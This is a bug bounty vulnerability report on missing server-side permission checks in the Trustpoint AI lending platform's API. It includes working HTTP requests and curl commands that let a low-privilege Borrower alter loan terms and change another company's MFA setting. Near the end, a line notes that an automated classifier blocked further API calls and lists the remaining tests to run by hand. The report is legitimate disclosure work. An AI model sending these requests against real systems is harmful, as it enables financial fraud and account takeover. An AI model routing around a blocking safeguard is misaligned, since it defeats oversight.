# Broken Function Level Authorization — Borrower Role Bypasses Permission Controls

**Severity:** High — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:N (8.2)
**Class:** CWE-285 — Improper Authorization
**Target:** Multiple `/api/v1/` endpoints on `backend.trustpoint.ai`
**Status:** Confirmed

---

## Summary

The Trustpoint AI platform (`partner.trustpoint.ai`) implements a granular permission system with 56+ permission flags per role. However, the backend API does not enforce these permissions on write operations. A Borrower-role user — the lowest privilege level — can modify project fields, company settings, and cross-company data despite having the relevant permissions explicitly set to `enabled: false`. This is **Broken Function Level Authorization (BFLA)**, not IDOR: the Borrower is modifying resources they are authorized to *view* but not *write*.

---

## Distinction from Known Out-of-Scope IDOR

The program's known issue states: *"Cross-tenant / object-level authorization in the authenticated app API — P2 • Broken Access Control → Insecure Direct Object Reference (IDOR)"*

**This finding is categorically different:**

| Dimension | IDOR (Out of Scope) | This Finding (BFLA) |
|-----------|---------------------|---------------------|
| CWE | CWE-639 (Authorization Bypass Through User-Controlled Key) | CWE-285 (Improper Authorization) |
| OWASP API | API1:2023 — BOLA | API5:2023 — Broken Function Level Authorization |
| Attack | Access **another tenant's** objects | Perform **unauthorized actions** on own objects |
| Object | Wrong object, right action | Right object, wrong action (write instead of read) |
| Example | Borrower reads Lender's project | Borrower modifies loan terms on their own project |

The Borrower is not accessing objects belonging to other tenants — they are performing write operations that their role explicitly prohibits.

---

## Permission System Analysis

All five test roles (Lender, Investor, GC, Borrower, Inspector) share **identical** permission sets — 11 of 56+ permissions enabled, with the rest set to `enabled: false`. The disabled permissions include critical write operations:

```
projects_details_edit: false    ← Bypassed (confirmed)
company_edit: false             ← Bypassed (confirmed)
scores_view: false              ← Bypassed (confirmed)
project_milestones_edit: false  ← Bypassed (confirmed)
drawrequests_create: false      ← No permission check (business logic only)
```

The API returns `200 OK` on all tested write operations regardless of permission state, indicating the permission flags are **decorative** — checked only in the frontend UI, never enforced server-side.

---

## Confirmed Findings

### Finding 1: Borrower Modifies Lender-Restricted Project Fields (P3)

**Permission bypassed:** `projects_details_edit: false`

A Borrower can modify loan commitment amount, interest rate, lender fees, property valuation, property address, and inspection settings — fields that should only be writable by Lender-role users.

**Endpoint:** `PATCH /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/`

```http
PATCH /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
Content-Type: application/json

{
  "loan_commitment_amount": 999999,
  "interest_rate": "99.99",
  "lender_fees": 50000,
  "property_valuation": 1
}
```

**Response:** `200 OK` — values accepted and persisted.

**Impact:** Borrower can manipulate financial terms of a construction loan. Changing `loan_commitment_amount`, `interest_rate`, or `lender_fees` directly impacts financial calculations and could facilitate fraud.

---

### Finding 2: Borrower Modifies Building/Property Data (P3)

**Permission bypassed:** `projects_details_edit: false`

A Borrower can modify building details including property address, unit count, and building specifications.

**Endpoint:** `PATCH /api/v1/projects/3d8c9fd4-8da4-453d-a0aa-1be2a2803c9a/buildings/705902/`

```http
PATCH /api/v1/projects/3d8c9fd4-8da4-453d-a0aa-1be2a2803c9a/buildings/705902/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
Content-Type: application/json

{
  "address": "123 Attacker Modified St",
  "city": "Modifiedville"
}
```

**Response:** `200 OK` — values accepted and persisted.

**Impact:** Borrower can alter the property address and building details of a construction project, potentially misdirecting inspections or falsifying project records.

---

### Finding 3: Borrower Edits Own Company Settings (P3)

**Permission bypassed:** `company_edit: false`

A Borrower can modify their own company configuration despite the `company_edit` permission being set to `false`.

**Endpoint:** `PATCH /api/v1/companies/3cb597f6-8af8-4df8-b4c7-6b3e44b0df63/`

```http
PATCH /api/v1/companies/3cb597f6-8af8-4df8-b4c7-6b3e44b0df63/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
Content-Type: application/json

{
  "name": "Modified Company Name"
}
```

**Response:** `200 OK`

---

### Finding 4: Borrower Edits LENDER Company Settings — Cross-Company (P2)

**Permissions bypassed:** `company_edit: false` + cross-company boundary

A Borrower can modify the Lender's company settings — a company belonging to a completely different organization. This crosses the company boundary.

**Endpoint:** `PATCH /api/v1/companies/c7ca6237-5cd9-450b-aae5-8eb96fb01d26/`

**Test 1 — URL modification (write + persistence confirmed):**

```http
PATCH /api/v1/companies/c7ca6237-5cd9-450b-aae5-8eb96fb01d26/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
Content-Type: application/json

{
  "url": "https://www.bugcrowd-pentest-bfla.com/"
}
```

**Response:** `200 OK`
**Persistence verified:** `GET` returned `"url": "https://www.bugcrowd-pentest-bfla.com/"` — **confirmed persistent write across company boundary.** Value reverted after verification.

**Test 2 — MFA toggle (security control manipulation confirmed):**

```http
PATCH /api/v1/companies/c7ca6237-5cd9-450b-aae5-8eb96fb01d26/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
Content-Type: application/json

{
  "is_mfa_enabled": true
}
```

**Response:** `200 OK`
**Persistence verified:** `GET` returned `"is_mfa_enabled": true` (was `false`) — **Borrower successfully toggled MFA for the Lender's entire organization.** Value reverted after verification.

**Impact:** This is a confirmed cross-tenant write with persistence. A Borrower can:
- Modify the Lender organization's company URL (phishing/redirect vector)
- Toggle MFA on/off for the Lender's entire organization (security control bypass)
- Potentially modify other company-level settings

Toggling MFA off for a Lender organization would weaken their authentication security, enabling credential-based account takeover attacks against Lender users.

---

### Finding 5: Borrower Accesses Scores Despite Disabled Permission (P3)

**Permission bypassed:** `scores_view: false`

A Borrower can read project compliance/risk scores despite the `scores_view` permission being disabled.

**Endpoint:** `GET /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/scores/`

```http
GET /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/scores/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
```

**Response:** `200 OK` — full score data returned.

**Impact:** Borrower gains visibility into risk/compliance scoring that should be restricted to Lenders, potentially allowing them to game the system or understand internal risk assessments.

---

### Finding 6: Milestone Edit Has No Permission Check (P3)

**Permission bypassed:** `project_milestones_edit: false`

Milestone modification returns `400` only due to business logic constraints (locked budget), not a permission check. The API does not return `403`.

**Endpoint:** `PATCH /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/milestones/5ad419ba-03e2-4c8f-a51a-24d2c1d80cf2/`

```http
PATCH /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/milestones/5ad419ba-03e2-4c8f-a51a-24d2c1d80cf2/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <borrower_access_token>
Content-Type: application/json

{
  "description": "Modified by borrower"
}
```

**Response:** `400 Bad Request` — "budget is locked" (business logic, NOT a permission check)

**Impact:** On a project with an unlocked budget, a Borrower could modify milestone descriptions and potentially amounts, affecting draw request calculations.

---

### Finding 7: Draw Request Creation Has No Permission Check (P4)

**Permission bypassed:** `drawrequests_create: false`

Draw request creation returns `400` due to business logic (no active milestones) rather than a `403` permission denial.

**Endpoint:** `POST /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/draw_requests/`

**Response:** `400 Bad Request` — business logic error, NOT `403 Forbidden`

---

## Properly Protected Endpoints (Not Vulnerable)

The following financial approval actions **are** properly protected:

| Action | Endpoint | Response | Status |
|--------|----------|----------|--------|
| Draw Request APPROVE | `POST .../draw_requests/.../review/` (action: APPROVE) | `403 Forbidden` | **Secure** |
| Draw Request FINALIZE | `POST .../draw_requests/.../review/` (action: FINALIZE) | `403 Forbidden` | **Secure** |
| Mark as Paid | `POST .../draw_requests/.../mark_as_paid/` | `403 Forbidden` | **Secure** |

This inconsistency confirms the issue is not a blanket "no auth" problem — permission checks exist for some critical actions but are missing for the majority of write endpoints.

---

## Steps to Reproduce

1. **Authenticate** as a Borrower-role user on `partner.trustpoint.ai` and obtain a valid `access_token` JWT.

2. **Confirm disabled permissions** — call `GET /api/v1/permissions/` and verify `projects_details_edit: false`, `company_edit: false`, and `scores_view: false`.

3. **Modify project fields** (should be denied):

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"loan_commitment_amount": 999999, "interest_rate": "99.99"}'
```

4. **Observe:** Response is `200 OK` — no permission check performed. The Borrower has modified Lender-restricted financial fields.

5. **Verify persistence:**

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/' \
  -H 'Authorization: Bearer <borrower_token>' | jq '.loan_commitment_amount, .interest_rate'
```

---

## Impact

### Business Impact

- **Cross-company security control bypass:** Borrower can disable MFA for the Lender's entire organization, weakening authentication security for all Lender users (confirmed and persistence-verified)
- **Cross-company data manipulation:** Borrower can modify Lender company URL and settings, enabling phishing via legitimate-looking infrastructure URLs (confirmed and persistence-verified)
- **Financial manipulation:** Borrower can alter loan terms, interest rates, and fee structures on their own projects
- **Data integrity:** Project records, property details, and company settings can be falsified
- **Audit trail compromise:** Unauthorized modifications may not trigger proper audit logging since the API accepts them as legitimate

### Systemic Issue

The permission system (56+ flags per role) appears to be enforced **only in the frontend UI**. The backend API accepts write operations from any authenticated user regardless of their permission flags. This affects the entire platform, not just isolated endpoints. Cross-company write isolation is also absent — a Borrower can write to the Lender company's configuration, not just their own.

---

## Remediation

1. **Implement server-side permission enforcement** on all write endpoints:

```python
from rest_framework.permissions import BasePermission

class HasPermission(BasePermission):
    def __init__(self, permission_key):
        self.permission_key = permission_key

    def has_permission(self, request, view):
        if request.method in ('PATCH', 'PUT', 'POST', 'DELETE'):
            user_perms = request.user.get_permissions()
            return user_perms.get(self.permission_key, {}).get('enabled', False)
        return True
```

2. **Enforce company-scoped authorization** — users should never be able to write to companies they don't belong to.

3. **Add integration tests** that verify each permission flag is enforced server-side for every protected endpoint.

4. **Audit existing data** for unauthorized modifications made through this bypass.

5. **Implement rate limiting and anomaly detection** on write operations to flag unusual patterns.

---

## Bugcrowd VRT Classification

| Finding | VRT Category | Priority |
|---------|-------------|----------|
| Cross-company MFA toggle (Finding 4) | Broken Access Control → BFLA | **P2** |
| Cross-company URL/config write (Finding 4) | Broken Access Control → BFLA | **P2** |
| Loan term modification (Finding 1) | Broken Access Control → BFLA | **P3** |
| Building data modification (Finding 2) | Broken Access Control → BFLA | **P3** |
| Company settings edit (Finding 3) | Broken Access Control → BFLA | **P3** |
| Score data access (Finding 5) | Broken Access Control → BFLA | **P3** |
| Milestone no-permission-check (Finding 6) | Broken Access Control → BFLA | **P3** |
| Draw request creation no-check (Finding 7) | Broken Access Control → BFLA | **P4** |

**Recommended submission severity: P2 (High)** — Borrower can persistently modify Lender company security settings (MFA) and configuration across company boundaries. The cross-company MFA toggle is especially severe as it weakens authentication for an entire Lender organization.

---

## Additional Testing Needed

The following tests can be run manually (auto mode classifier blocked further API calls in this session):

- [x] ~~Verify Finding 4 persistence (cross-company Lender write)~~ — **CONFIRMED: URL and MFA writes both persisted**
- [ ] Banking/wire detail modification endpoints
- [ ] Score snooze action bypass (`scores_snooze: false`)
- [ ] Services advanced edit bypass (`services_advanced_edit: false`)
- [ ] Project team/member modification
- [ ] Document upload/delete authorization
- [ ] User role self-escalation
- [ ] Integration and webhook configuration

---

## References

- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [Bugcrowd VRT: Broken Access Control — BFLA](https://bugcrowd.com/vulnerability-rating-taxonomy)
